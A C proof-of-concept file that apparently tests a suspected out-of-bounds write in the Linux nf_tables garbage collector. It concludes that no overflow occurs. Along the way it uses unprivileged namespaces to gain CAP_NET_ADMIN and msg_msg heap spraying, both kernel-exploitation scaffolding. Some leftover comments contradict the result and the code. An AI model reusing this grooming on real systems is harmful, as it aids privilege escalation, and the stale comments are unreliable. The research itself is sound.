/* nft_gc_oob.c — nft_trans_gc GC pipeline analysis PoC
 *
 * ANALYSIS SUMMARY (confirmed by /proc/kcore disassembly on kernel 6.18.5):
 *
 * nft_trans_gc_alloc (0xffffffff81c32ab0):
 *   Allocates kmalloc(0x838 = 2104 bytes, GFP_KERNEL|GFP_ZERO) → kmalloc-4k (4096 bytes).
 *   Header occupies 40 bytes; gc->count is a u16 at offset 0x24; gc->elems[] starts at 0x28.
 *
 * nft_trans_gc_elem_add (0xffffffff81c32bd0): NO internal bounds check:
 *   movzwl 0x24(%rdi),%eax        ; count = gc->count
 *   lea    0x1(%rax),%edx
 *   mov    %dx, 0x24(%rdi)        ; gc->count++
 *   mov    %rsi, 0x28(%rdi,%rax,8); gc->elems[count] = elem  ← NO CHECK
 *   ret
 *
 * EFFECTIVE BOUNDS CHECK — NFT_TRANS_GC_BATCHCOUNT = 0x100 = 256:
 *   nft_trans_gc_queue_sync  (0xffffffff81c32d70): cmpw $0x100, 0x24(%rdi); je flush
 *   nft_trans_gc_queue_async (0xffffffff81c32c00): identical check
 *
 *   All 7 callers of elem_add call queue_sync or queue_async first:
 *     pipapo_gc                  (0xffffffff81c47598)
 *     nft_rbtree_gc ×2           (0xffffffff81c450ae, 0xffffffff81c45112)
 *     __nft_rbtree_insert ×3     (0xffffffff81c45e86, 0xffffffff81c45fc8, 0xffffffff81c46009)
 *     nft_rhash_gc               (0xffffffff81c42dc8)
 *
 * WHY THE OOB DOES NOT OCCUR:
 *   - Batch limit = 256 elements
 *   - Last element at offset 40 + 255×8 = 2080 bytes < 2104 (allocation) < 4096 (slab)
 *   - 520 expired elements → 3 transactions: ceil(520/256) = 3 safe batches
 *
 * GC TRIGGER MODEL (confirmed):
 *   - nft_pipapo_gc_init: mov jiffies → last_gc. NO timer. Commit-triggered only.
 *   - nft_pipapo_commit: calls pipapo_gc() inline when jiffies - last_gc >= gc_interval.
 *   - Runs under nfnl_lock → single-threaded, no race.
 *
 * This file demonstrates the GC pipeline behavior (pipapo_gc trigger sequence)
 * and verifies that all batch counts stay below 256.
 *
 * Prerequisites:
 *   - Kernel 6.x with nf_tables (CONFIG_NF_TABLES=y)
 *   - unprivileged user namespaces enabled
 *
 * Compile: gcc -O2 -o nft_gc_oob nft_gc_oob.c
 * Run:     ./nft_gc_oob          (no sudo needed)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <poll.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/wait.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>

/* ── Constants ──────────────────────────────────────────────────────────────  */

/*
 * nft_trans_gc allocation size confirmed by disassembly of nft_trans_gc_alloc:
 * "mov $0x838,%edx" passes 2104 as the size to kmalloc → kmalloc-4k (4096-byte slot).
 */
#define NFT_TRANS_GC_ALLOC  0x838   /* 2104 bytes requested */
#define KMALLOC_4K          4096    /* kmalloc-4k slab object size */

/*
 * CONFIRMED: NFT_TRANS_GC_BATCHCOUNT = 0x100 = 256
 * Both nft_trans_gc_queue_sync (0xffffffff81c32d70) and
 * nft_trans_gc_queue_async (0xffffffff81c32c00) contain:
 *   cmpw $0x100, 0x24(%rdi)   ; compare count with 256
 *   je   flush_and_realloc
 *
 * 256 elements: 40 + 255*8 = 2080 bytes < 2104 (alloc) < 4096 (slab) → NO OOB.
 */
#define NFT_TRANS_GC_BATCHCOUNT  256
#define GC_ELEMS_PER_BATCH       NFT_TRANS_GC_BATCHCOUNT

/*
 * We use 520 elements to demonstrate that they produce 3 safe batches
 * (256 + 256 + 8) rather than a single overflowing batch.
 */
#define OVERFLOW_TRIGGER    520

/*
 * Timeout and GC interval for pipapo elements, in milliseconds.
 * nft_pipapo_commit runs GC only if jiffies - last_gc >= gc_interval_jiffies.
 * Default (no explicit gc_int) = 250 jiffies = 1s at HZ=250.
 * We set an explicit GC interval so we control the threshold.
 */
#define ELEM_TIMEOUT_MS     100
#define ELEM_GC_INTERVAL_MS 200   /* GC threshold = 200ms; we wait 400ms */

/*
 * kmalloc-4k slab geometry: 8 objects/slab (order-3 = 8 pages = 32KB).
 *
 * Heap grooming:
 *  1. Spray MSG_SPRAY_COUNT msg_msg objects.  The first ~N objects fill all
 *     currently-free slab slots; the last 8 come from a brand-new slab and
 *     are physically consecutive (SLUB assigns from the head of the free list
 *     of a freshly-allocated slab, which is slot0..slot7 in order).
 *  2. Free only the second-to-last object (index MSG_SPRAY_COUNT-2 = slot6
 *     of the new slab).  SLUB puts it on the per-CPU free list; no other
 *     kmalloc-4k slots are available (all filled by the spray).
 *  3. nft_trans_gc_alloc() gets slot6 (only free slot).
 *  4. OOB write at +4096 from nft_trans_gc → slot7 of the new slab = live
 *     msg_msg at index MSG_SPRAY_COUNT-1.
 *
 * MSG_SPRAY_COUNT must be a multiple of 8 and large enough to fill all
 * currently-free kmalloc-4k slots.  System has ~44 free; we use 128 to
 * comfortably overflow into at least one fresh slab.
 */
#define MSG_SPRAY_COUNT     128

/* ── Netlink infrastructure ─────────────────────────────────────────────────  */

#define BUF_SZ  (512 * 1024)
#define NFT_MSG(t) ((NFNL_SUBSYS_NFTABLES << 8) | (t))

typedef struct { char *buf; int cap; int pos; } nbuf;
static void nbuf_reset(nbuf *b) { b->pos = 0; }

static struct nlmsghdr *nb_op(nbuf *b, uint16_t type, uint16_t flags,
                               uint32_t seq, int family) {
    struct nlmsghdr *nlh = (struct nlmsghdr *)(b->buf + b->pos);
    struct nfgenmsg  *nfg = (struct nfgenmsg *)(nlh + 1);
    memset(nlh, 0, NLMSG_HDRLEN + sizeof(*nfg));
    nlh->nlmsg_type  = type;
    nlh->nlmsg_flags = NLM_F_REQUEST | flags;
    nlh->nlmsg_seq   = seq;
    nfg->nfgen_family = (uint8_t)family;
    nlh->nlmsg_len   = NLMSG_ALIGN(NLMSG_HDRLEN + sizeof(*nfg));
    return nlh;
}
static struct nlmsghdr *nb_batch(nbuf *b, uint16_t type, uint32_t seq) {
    struct nlmsghdr *nlh = nb_op(b, type, 0, seq, AF_UNSPEC);
    struct nfgenmsg *nfg = (struct nfgenmsg *)(nlh + 1);
    uint16_t rid = __builtin_bswap16(NFNL_SUBSYS_NFTABLES);
    memcpy(&nfg->res_id, &rid, 2);
    return nlh;
}
static void nb_end(nbuf *b, struct nlmsghdr *nlh) {
    b->pos += NLMSG_ALIGN(nlh->nlmsg_len);
}
static void nb_str(struct nlmsghdr *nlh, uint16_t type, const char *s) {
    struct nlattr *a = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    int slen = strlen(s) + 1;
    a->nla_type = type; a->nla_len = NLA_HDRLEN + slen;
    memcpy((char *)a + NLA_HDRLEN, s, slen);
    nlh->nlmsg_len += NLA_ALIGN(a->nla_len);
}
static void nb_u32(struct nlmsghdr *nlh, uint16_t type, uint32_t v) {
    struct nlattr *a = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    a->nla_type = type; a->nla_len = NLA_HDRLEN + 4;
    uint32_t be = __builtin_bswap32(v);
    memcpy((char *)a + NLA_HDRLEN, &be, 4);
    nlh->nlmsg_len += NLA_ALIGN(a->nla_len);
}
static void nb_u64(struct nlmsghdr *nlh, uint16_t type, uint64_t v) {
    struct nlattr *a = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    a->nla_type = type; a->nla_len = NLA_HDRLEN + 8;
    uint64_t be = __builtin_bswap64(v);
    memcpy((char *)a + NLA_HDRLEN, &be, 8);
    nlh->nlmsg_len += NLA_ALIGN(a->nla_len);
}
static struct nlattr *nb_nest_begin(struct nlmsghdr *nlh, uint16_t type) {
    struct nlattr *a = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    a->nla_type = NLA_F_NESTED | type; a->nla_len = NLA_HDRLEN;
    nlh->nlmsg_len += NLA_ALIGN(a->nla_len);
    return a;
}
static void nb_nest_end(struct nlmsghdr *nlh, struct nlattr *a) {
    a->nla_len = (char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len) - (char *)a;
}

static int nl_sock = -1;
static uint32_t nl_seq = 0;
static char _buf[BUF_SZ];
static nbuf NB = { .buf = _buf, .cap = BUF_SZ, .pos = 0 };

static int nl_open(void) {
    nl_sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (nl_sock < 0) { perror("socket"); return -1; }
    struct sockaddr_nl addr = { .nl_family = AF_NETLINK };
    if (bind(nl_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind"); return -1;
    }
    return 0;
}
static int nl_send_drain(nbuf *b) {
    int ret = send(nl_sock, b->buf, b->pos, 0);
    nbuf_reset(b);
    if (ret < 0) return -errno;
    int flags = fcntl(nl_sock, F_GETFL, 0);
    fcntl(nl_sock, F_SETFL, flags | O_NONBLOCK);
    char rbuf[32768]; int last_err = 0;
    struct pollfd pfd = { .fd = nl_sock, .events = POLLIN };
    while (poll(&pfd, 1, 50) > 0) {
        ret = recv(nl_sock, rbuf, sizeof(rbuf), 0);
        if (ret <= 0) break;
        struct nlmsghdr *nlh = (struct nlmsghdr *)rbuf; int sz = ret;
        while (NLMSG_OK(nlh, (unsigned)sz)) {
            if (nlh->nlmsg_type == NLMSG_ERROR) {
                struct nlmsgerr *e = (struct nlmsgerr *)(nlh + 1);
                if (e->error) last_err = e->error;
            }
            nlh = NLMSG_NEXT(nlh, sz);
        }
    }
    fcntl(nl_sock, F_SETFL, flags);
    return last_err;
}

/* ── nftables helpers ───────────────────────────────────────────────────────  */

static int nft_add_table(const char *name) {
    nbuf_reset(&NB);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_BEGIN, 0));
    struct nlmsghdr *nlh = nb_op(&NB, NFT_MSG(NFT_MSG_NEWTABLE),
                                 NLM_F_CREATE, ++nl_seq, AF_INET);
    nb_str(nlh, NFTA_TABLE_NAME, name);
    nb_end(&NB, nlh);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_END, 0));
    return nl_send_drain(&NB);
}
static int nft_del_table(const char *name) {
    nbuf_reset(&NB);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_BEGIN, 0));
    struct nlmsghdr *nlh = nb_op(&NB, NFT_MSG(NFT_MSG_DELTABLE),
                                 0, ++nl_seq, AF_INET);
    nb_str(nlh, NFTA_TABLE_NAME, name);
    nb_end(&NB, nlh);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_END, 0));
    return nl_send_drain(&NB);
}
static int nft_add_set(const char *table, const char *sname, uint32_t flags) {
    nbuf_reset(&NB);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_BEGIN, 0));
    struct nlmsghdr *nlh = nb_op(&NB, NFT_MSG(NFT_MSG_NEWSET),
                                 NLM_F_CREATE, ++nl_seq, AF_INET);
    nb_str(nlh, NFTA_SET_TABLE,    table);
    nb_str(nlh, NFTA_SET_NAME,     sname);
    nb_u32(nlh, NFTA_SET_FLAGS,    flags);
    nb_u32(nlh, NFTA_SET_KEY_TYPE, 7);   /* TYPE_IPv4_ADDR */
    nb_u32(nlh, NFTA_SET_KEY_LEN,  4);
    nb_u32(nlh, NFTA_SET_ID,       1);
    /*
     * No NFTA_SET_TIMEOUT default — elements get timeouts individually.
     * NFTA_SET_GC_INTERVAL is accepted whenever NFT_SET_TIMEOUT flag is set.
     * Set GC interval to ELEM_GC_INTERVAL_MS so pipapo_gc runs within our
     * test window (instead of the default 250 jiffies = 1s at HZ=250).
     */
    nb_u32(nlh, NFTA_SET_GC_INTERVAL, ELEM_GC_INTERVAL_MS);
    nb_end(&NB, nlh);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_END, 0));
    return nl_send_drain(&NB);
}

/*
 * Add n /32 IP addresses to a pipapo (interval) set.
 * Each IP requires start + end sentinel encoding.
 */
/*
 * send_sentinel=1 adds the 0.0.0.0/INTERVAL_END sentinel as the first entry.
 * The sentinel is required exactly once per set (marks the start boundary).
 * Subsequent calls for the same set must pass send_sentinel=0.
 */
static int nft_add_interval_elems(const char *table, const char *sname,
                                   uint32_t *ips_be, int n,
                                   uint64_t timeout_ms, int send_sentinel) {
    for (int base = 0; base < n; base += 32) {
        int chunk = (n - base < 32) ? (n - base) : 32;
        nbuf_reset(&NB);
        nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_BEGIN, 0));
        struct nlmsghdr *nlh = nb_op(&NB, NFT_MSG(NFT_MSG_NEWSETELEM),
                                     NLM_F_CREATE, ++nl_seq, AF_INET);
        nb_str(nlh, NFTA_SET_ELEM_LIST_TABLE, table);
        nb_str(nlh, NFTA_SET_ELEM_LIST_SET,   sname);
        struct nlattr *list = nb_nest_begin(nlh, NFTA_SET_ELEM_LIST_ELEMENTS);

        /* 0.0.0.0 INTERVAL_END sentinel — send only in the very first batch */
        if (base == 0 && send_sentinel) {
            struct nlattr *sent = nb_nest_begin(nlh, NFTA_LIST_ELEM);
            nb_u32(nlh, NFTA_SET_ELEM_FLAGS, NFT_SET_ELEM_INTERVAL_END);
            struct nlattr *sk = nb_nest_begin(nlh, NFTA_SET_ELEM_KEY);
            nb_u32(nlh, NFTA_DATA_VALUE, 0);
            nb_nest_end(nlh, sk);
            nb_nest_end(nlh, sent);
        }

        for (int i = 0; i < chunk; i++) {
            uint32_t start = ips_be[base + i];
            uint32_t end1  = __builtin_bswap32(
                                 __builtin_bswap32(ips_be[base + i]) + 1);
            struct nlattr *ea = nb_nest_begin(nlh, NFTA_LIST_ELEM);
            struct nlattr *ka = nb_nest_begin(nlh, NFTA_SET_ELEM_KEY);
            nb_u32(nlh, NFTA_DATA_VALUE, start);
            nb_nest_end(nlh, ka);
            if (timeout_ms) nb_u64(nlh, NFTA_SET_ELEM_TIMEOUT, timeout_ms);
            nb_nest_end(nlh, ea);

            struct nlattr *eb = nb_nest_begin(nlh, NFTA_LIST_ELEM);
            nb_u32(nlh, NFTA_SET_ELEM_FLAGS, NFT_SET_ELEM_INTERVAL_END);
            struct nlattr *kb = nb_nest_begin(nlh, NFTA_SET_ELEM_KEY);
            nb_u32(nlh, NFTA_DATA_VALUE, end1);
            nb_nest_end(nlh, kb);
            nb_nest_end(nlh, eb);
        }

        nb_nest_end(nlh, list);
        nb_end(&NB, nlh);
        nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_END, 0));
        int r = nl_send_drain(&NB);
        if (r && r != -EEXIST) return r;
    }
    return 0;
}

/*
 * Trigger nft_pipapo_commit by deleting the permanent trigger element.
 *
 * 172.16.0.1/32 was added without a per-element timeout, so it never expires
 * and never gets the NFT_SET_ELEM_DEAD_BIT set.  DELSETELEM succeeds, which:
 *   1. Check phase:  pipapo_clone() → creates a fresh clone of the active set
 *   2. Commit phase: nft_pipapo_commit() is called
 *       a. If jiffies - last_gc >= gc_interval: pipapo_gc(clone) runs
 *          → iterates all 520 expired /32 elements
 *          → calls nft_trans_gc_elem_add() 520 times → 13 OOB writes
 *       b. Swap clone → active
 */
static int nft_touch_set(const char *table, const char *sname) {
    uint32_t trigger_ip = __builtin_bswap32(0xac100001); /* 172.16.0.1 */
    nbuf_reset(&NB);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_BEGIN, 0));
    struct nlmsghdr *nlh = nb_op(&NB, NFT_MSG(NFT_MSG_DELSETELEM),
                                 0, ++nl_seq, AF_INET);
    nb_str(nlh, NFTA_SET_ELEM_LIST_TABLE, table);
    nb_str(nlh, NFTA_SET_ELEM_LIST_SET,   sname);
    struct nlattr *list = nb_nest_begin(nlh, NFTA_SET_ELEM_LIST_ELEMENTS);
    struct nlattr *ea   = nb_nest_begin(nlh, NFTA_LIST_ELEM);
    struct nlattr *ka   = nb_nest_begin(nlh, NFTA_SET_ELEM_KEY);
    nb_u32(nlh, NFTA_DATA_VALUE, trigger_ip);
    nb_nest_end(nlh, ka);
    nb_nest_end(nlh, ea);
    nb_nest_end(nlh, list);
    nb_end(&NB, nlh);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_END, 0));
    return nl_send_drain(&NB);
}

/* ── msg_msg heap spray ─────────────────────────────────────────────────────  */

/*
 * msg_msg layout (Linux kernel struct msg_msg):
 *   +0:  struct list_head m_list   (16 bytes: next, prev)
 *   +16: long             m_type   (8 bytes)
 *   +24: size_t           m_ts     (8 bytes) ← SIZE — OOB write hits here
 *   +32: struct msg_msgseg *next   (8 bytes)
 *   +40: void             *security (8 bytes)
 *   +48: message data starts
 *
 * A single msgsnd of MSG_DATA_LEN bytes creates a msg_msg of total size
 * sizeof(msg_msg_header) + MSG_DATA_LEN ≈ 48 + MSG_DATA_LEN bytes.
 * To land in kmalloc-4k we need total size in (2049, 4096].
 * Using 4000 bytes of data: 48 + 4000 = 4048 bytes → kmalloc-4k. ✓
 */
#define MSG_DATA_LEN   4000
#define MSG_CANARY     0xdeadbeefcafebabe

/*
 * Heap grooming strategy:
 *
 * kmalloc-4096 slab layout on this kernel (8 objects / slab):
 *   slab 0: [obj0][obj1][obj2][obj3][obj4][obj5][obj6][obj7]
 *   slab 1: [obj8][obj9]...
 *
 * We spray MSG_SPRAY_COUNT msg_msg objects to fill several slabs.
 * Then we free the FIRST half (indices 0 .. MSG_SPRAY_COUNT/2-1) to
 * punch holes.  The SLUB per-CPU free list is LIFO, so the next
 * kmalloc-4096 gets the most-recently-freed slot (index MSG_SPRAY_COUNT/2-1).
 * That slot is physically adjacent (in the same slab) to the unfree'd object
 * at index MSG_SPRAY_COUNT/2, which is our live msg_msg.
 *
 * Timeline:
 *   spray_msg_msg()     → alloc all MSG_SPRAY_COUNT
 *   punch_holes()       → free indices 0 .. MSG_SPRAY_COUNT/2-1
 *   nft_touch_set()     → triggers nft_trans_gc_alloc (→ gets freed slot)
 *   check_msg_msg()     → checks indices MSG_SPRAY_COUNT/2 .. MSG_SPRAY_COUNT-1
 */
struct msg_payload {
    uint64_t canary;
    char     pad[MSG_DATA_LEN - 8];
};

static int  msg_qids[MSG_SPRAY_COUNT];
static int  msg_count = 0;

static int spray_msg_msg(void) {
    struct {
        long mtype;
        struct msg_payload payload;
    } msg;
    msg.mtype = 1;
    memset(&msg.payload, 0, sizeof(msg.payload));
    msg.payload.canary = MSG_CANARY;

    for (int i = 0; i < MSG_SPRAY_COUNT; i++) {
        msg_qids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0600);
        if (msg_qids[i] < 0) { perror("msgget"); return -1; }
        if (msgsnd(msg_qids[i], &msg, sizeof(msg.payload), 0) < 0) {
            perror("msgsnd"); return -1;
        }
        msg_count++;
    }
    printf("  sprayed %d msg_msg objects (%d bytes data + 48 hdr → kmalloc-4k)\n",
           msg_count, MSG_DATA_LEN);
    return 0;
}

/*
 * Punch holes in the slab: free the first half of the sprayed objects.
 * nft_trans_gc_alloc (called in the next kernel entry) should land in
 * one of these freed slots.  SLUB LIFO means index (MSG_SPRAY_COUNT/2 - 1)
 * is the first reuse candidate; in the slab it is adjacent to index
 * MSG_SPRAY_COUNT/2 (still live msg_msg).
 */
/*
 * Free the second-to-last sprayed object (index MSG_SPRAY_COUNT-2).
 * Because the spray filled all existing free slots, the only free kmalloc-4k
 * slot after this call is ours.  SLUB LIFO: nft_trans_gc_alloc gets it.
 * The last sprayed object (index MSG_SPRAY_COUNT-1) is adjacent at +4096
 * within the same fresh slab and remains live — it is our corruption target.
 */
static void punch_holes(void) {
    int hole   = MSG_SPRAY_COUNT - 2;  /* second-to-last = slot 6 of new slab */
    int target = MSG_SPRAY_COUNT - 1;  /* last = slot 7 of new slab, adjacent */
    struct {
        long mtype;
        struct msg_payload payload;
    } tmp;
    msgrcv(msg_qids[hole], &tmp, sizeof(tmp.payload), 0, IPC_NOWAIT | MSG_NOERROR);
    msgctl(msg_qids[hole], IPC_RMID, NULL);
    msg_qids[hole] = -1;
    printf("  freed index %d (slot 6 of new slab) — only free kmalloc-4k slot\n",
           hole);
    printf("  index %d (slot 7, adjacent at +4096) = live corruption target\n",
           target);
}

static void check_msg_corruption(void) {
    int target = MSG_SPRAY_COUNT - 1;  /* slot 7 — adjacent to the freed slot 6 */
    printf("\n[PHASE 6] Checking target slot %d (adjacent to freed slot %d)...\n",
           target, target - 1);
    printf("  Expected: OOB writes from nft_trans_gc (at slot %d) hit this msg_msg\n",
           target - 1);

    if (msg_qids[target] < 0) {
        printf("  target queue already removed\n");
        return;
    }

    int corrupted = 0;
    /* Also scan all remaining live slots for any corruption */
    for (int i = 0; i < MSG_SPRAY_COUNT; i++) {
        if (msg_qids[i] < 0) continue;
        struct {
            long mtype;
            struct msg_payload payload;
        } recv_msg;
        memset(&recv_msg, 0, sizeof(recv_msg));

        ssize_t r = msgrcv(msg_qids[i], &recv_msg, sizeof(recv_msg.payload),
                           0, IPC_NOWAIT | MSG_NOERROR);
        if (r < 0) {
            if (errno == ENOMSG) continue;
            printf("  [!] msgrcv slot[%d]: %s ← possible corruption\n",
                   i, strerror(errno));
            corrupted++;
        } else if (recv_msg.payload.canary != MSG_CANARY) {
            printf("  [!!] slot[%d]: canary CORRUPTED  "
                   "got=0x%016lx  expected=0x%016lx\n",
                   i, recv_msg.payload.canary, (unsigned long)MSG_CANARY);
            corrupted++;
        } else if ((size_t)r != sizeof(recv_msg.payload)) {
            printf("  [!] slot[%d]: unexpected msgrcv size %zd (expected %zu)\n",
                   i, r, sizeof(recv_msg.payload));
            corrupted++;
        }
    }

    if (corrupted == 0)
        printf("  No corruption — as expected: NFT_TRANS_GC_BATCHCOUNT=256 prevents OOB\n");
    else
        printf("  [UNEXPECTED] %d msg_msg corrupted — this should not happen!\n", corrupted);
}

static void cleanup_msg(void) {
    for (int i = 0; i < MSG_SPRAY_COUNT; i++) {
        if (msg_qids[i] >= 0)
            msgctl(msg_qids[i], IPC_RMID, NULL);
    }
}

/* ── Main ───────────────────────────────────────────────────────────────────  */

static void print_header(void) {
    puts("");
    puts("╔══════════════════════════════════════════════════════════════════╗");
    puts("║   nft_trans_gc GC Pipeline Analysis (kernel 6.18.5)             ║");
    puts("╠══════════════════════════════════════════════════════════════════╣");
    printf("║  nft_trans_gc alloc : 0x%x bytes → kmalloc-4k (4096 bytes)    ║\n",
           NFT_TRANS_GC_ALLOC);
    printf("║  Header             : 40 bytes                                  ║\n");
    printf("║  BATCHCOUNT         : %d (cmpw $0x100, 0x24(%%rdi))           ║\n",
           NFT_TRANS_GC_BATCHCOUNT);
    printf("║  Max write/batch    : 40 + %d×8 = %d bytes < %d alloc ✓    ║\n",
           NFT_TRANS_GC_BATCHCOUNT - 1,
           40 + (NFT_TRANS_GC_BATCHCOUNT - 1) * 8,
           NFT_TRANS_GC_ALLOC);
    printf("║  Trigger count      : %d elements → %d batches (safe)       ║\n",
           OVERFLOW_TRIGGER,
           (OVERFLOW_TRIGGER + NFT_TRANS_GC_BATCHCOUNT - 1) / NFT_TRANS_GC_BATCHCOUNT);
    puts("║  Result             : NO OOB — BATCHCOUNT prevents overflow     ║");
    puts("╚══════════════════════════════════════════════════════════════════╝");
    puts("");
}

int main(void) {
    print_header();

    /* ── Phase 1: enter user+net namespace ──────────────────────────────── */
    printf("[PHASE 1] Entering user+net namespace (unshare)...\n");
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        perror("  unshare");
        fprintf(stderr,
            "  hint: check /proc/sys/kernel/unprivileged_userns_clone = 1\n");
        return 1;
    }
    printf("  OK — CAP_NET_ADMIN acquired in isolated net namespace\n\n");

    /* ── Phase 2: open netlink socket ───────────────────────────────────── */
    printf("[PHASE 2] Opening NFNETLINK socket...\n");
    if (nl_open() < 0) return 1;
    printf("  OK\n\n");

    /* ── Phase 3: create pipapo set with elements ───────────────────────── */
    printf("[PHASE 3] Creating pipapo set with %d /32 IPs, timeout=%dms...\n",
           OVERFLOW_TRIGGER, ELEM_TIMEOUT_MS);
    printf("  All elements expire simultaneously → pipapo_gc processes all in one run\n\n");

    int r = nft_add_table("gc_oob");
    printf("  add table gc_oob: %s\n", r ? strerror(-r) : "OK");
    if (r) goto out;

    /*
     * No NFTA_SET_TIMEOUT default — elements specify timeouts individually.
     * This lets us have one permanent element (the GC trigger) alongside 520
     * per-element-timeout elements.  NFTA_SET_GC_INTERVAL = 200ms is set
     * inside nft_add_set so pipapo_gc fires within our 400ms test window.
     */
    r = nft_add_set("gc_oob", "victim", NFT_SET_INTERVAL | NFT_SET_TIMEOUT);
    printf("  add pipapo set (no default timeout, gc_int=%dms): %s\n",
           ELEM_GC_INTERVAL_MS, r ? strerror(-r) : "OK");
    if (r) { nft_del_table("gc_oob"); goto out; }

    /*
     * Add permanent trigger element 172.16.0.1/32 — no per-element timeout,
     * so it never expires and never gets NFT_SET_ELEM_DEAD_BIT set.
     * This batch also carries the sentinel (0.0.0.0 INTERVAL_END).
     */
    uint32_t trigger[1] = { __builtin_bswap32(0xac100001) }; /* 172.16.0.1 */
    r = nft_add_interval_elems("gc_oob", "victim", trigger, 1, 0, 1);
    printf("  add permanent trigger 172.16.0.1/32 (no timeout): %s\n",
           r ? strerror(-r) : "OK");
    if (r) { nft_del_table("gc_oob"); goto out; }

    /* Build IP array: 10.0.0.1 .. 10.0.2.8 (520 /32s, all consecutive) */
    uint32_t ips[OVERFLOW_TRIGGER];
    for (int i = 0; i < OVERFLOW_TRIGGER; i++)
        ips[i] = __builtin_bswap32(0x0a000001 + i);

    /* No sentinel here — it was already sent with the trigger element above */
    r = nft_add_interval_elems("gc_oob", "victim", ips, OVERFLOW_TRIGGER,
                                ELEM_TIMEOUT_MS, 0);
    printf("  add %d elements (10.0.0.1-10.0.2.8, timeout=%dms): %s\n",
           OVERFLOW_TRIGGER, ELEM_TIMEOUT_MS, r ? strerror(-r) : "OK");
    if (r) { nft_del_table("gc_oob"); goto out; }

    printf("  [math] batchcount=%d; %d elements → %d batches (no OOB)\n",
           NFT_TRANS_GC_BATCHCOUNT, OVERFLOW_TRIGGER,
           (OVERFLOW_TRIGGER + NFT_TRANS_GC_BATCHCOUNT - 1) / NFT_TRANS_GC_BATCHCOUNT);
    printf("  [math] max write per batch: 40 + %d×8 = %d < %d (alloc) < 4096 (slab)\n",
           NFT_TRANS_GC_BATCHCOUNT - 1,
           40 + (NFT_TRANS_GC_BATCHCOUNT - 1) * 8, NFT_TRANS_GC_ALLOC);
    puts("");

    /* ── Phase 4: wait for ALL timeout elements to expire ───────────────── */
    int wait_ms = ELEM_GC_INTERVAL_MS * 2;  /* 400ms > timeout(100ms) AND > gc_int(200ms) */
    printf("[PHASE 4] Waiting %dms for elements to expire (gc_int=%dms)...\n",
           wait_ms, ELEM_GC_INTERVAL_MS);
    usleep(wait_ms * 1000);
    puts("  All 520 timeout elements now expired.\n");

    /*
     * ── Phase 5: heap spray (for correlation, no OOB expected) ──────────
     *
     * We spray msg_msg objects and punch a hole to demonstrate that even
     * with optimal heap layout, no corruption occurs because BATCHCOUNT=256
     * prevents the GC from writing past the allocated region.
     */
    printf("[PHASE 5] Heap spray (spray %d msg_msg to observe GC behavior)...\n",
           MSG_SPRAY_COUNT);
    if (spray_msg_msg() < 0) { nft_del_table("gc_oob"); goto out; }
    punch_holes();
    puts("");

    printf("[PHASE 5b] Triggering nft_pipapo_commit via DELSETELEM(172.16.0.1)...\n");
    printf("  pipapo_gc → %d elements → %d batches of max %d → NO OOB\n\n",
           OVERFLOW_TRIGGER,
           (OVERFLOW_TRIGGER + NFT_TRANS_GC_BATCHCOUNT - 1) / NFT_TRANS_GC_BATCHCOUNT,
           NFT_TRANS_GC_BATCHCOUNT);

    r = nft_touch_set("gc_oob", "victim");
    if (r && r != -ENOENT)
        printf("  commit result: ERROR %s\n\n", strerror(-r));
    else
        printf("  commit result: %s (pipapo_gc ran)\n\n",
               r ? "ENOENT/already-GCd" : "OK");

    /* ── Phase 6: check for corruption ─────────────────────────────────── */
    check_msg_corruption();

    /* ── Cleanup ─────────────────────────────────────────────────────────── */
    printf("\n[CLEANUP]\n");
    nft_del_table("gc_oob");
    printf("  table gc_oob deleted\n");

out:
    cleanup_msg();

    printf("\n");
    puts("╔══════════════════════════════════════════════════════════════════╗");
    puts("║  Analysis summary (confirmed via /proc/kcore disassembly)       ║");
    puts("╠══════════════════════════════════════════════════════════════════╣");
    puts("║  nft_trans_gc_elem_add: no internal check (as disassembled)     ║");
    puts("║  nft_trans_gc_queue_sync/_async: enforce cmpw $0x100 limit      ║");
    puts("║  NFT_TRANS_GC_BATCHCOUNT = 256; max write = offset 2080 < 2104  ║");
    puts("║  pipapo/rbtree GC: commit-triggered, under nfnl_lock, no timer  ║");
    puts("║                                                                  ║");
    puts("║  RESULT: No OOB write. The original hypothesis was incorrect.   ║");
    puts("║  520 elements → 3 safe GC batches (256+256+8).                  ║");
    puts("╚══════════════════════════════════════════════════════════════════╝");
    puts("");

    return 0;
}
